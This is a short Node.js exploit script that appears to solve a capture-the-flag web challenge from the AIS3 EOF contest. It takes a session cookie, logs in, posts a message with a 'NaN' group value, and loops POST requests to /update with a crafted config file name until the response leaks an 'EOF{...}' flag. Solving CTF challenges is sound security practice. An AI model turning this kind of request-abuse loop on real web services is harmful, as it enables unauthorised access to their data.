const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args))

// const host = "http://localhost:13000"
const host = "http://chals2.eof.ais3.org:11235"

let headers = {
  "content-type": "application/x-www-form-urlencoded"
}

async function getCookie() {
  return (await (fetch(host, { headers }).then(res => res.headers.get('set-cookie')))).split(";")[0]
}

async function login(body) {
  return await fetch(`${host}/login`, { headers, body, "method": "POST" })
}

async function sendMessage(body) {
  return await fetch(`${host}/sendMessage`, { headers, body, "method": "POST" })
}
async function update(body) {
  try {
    return await fetch(`${host}/update`, { headers, body, "method": "POST" })
  } catch (error) {
    return { text: async function () { return "" } }
  }
}

async function main() {
  let cookie = await getCookie()
  headers.cookie = cookie
  await login("username=tyzesc")
  await sendMessage("title=THIS+IS+TITLE&content=CONTENT&group=NaN")

  let found = false
  while (!found) {
    let res = await update("config=d09ecdd837431a29bec13669c01161d6f79ed2846590a79bf421ddcf4d8bd718.json")
    let t = await res.text()
    if (t.includes("EOF{")) {
      found = true
      console.log("[*] got flag:", /EOF\{.+\}/.exec(t)[0])
    }
    await sleep(1)
  }
}

main()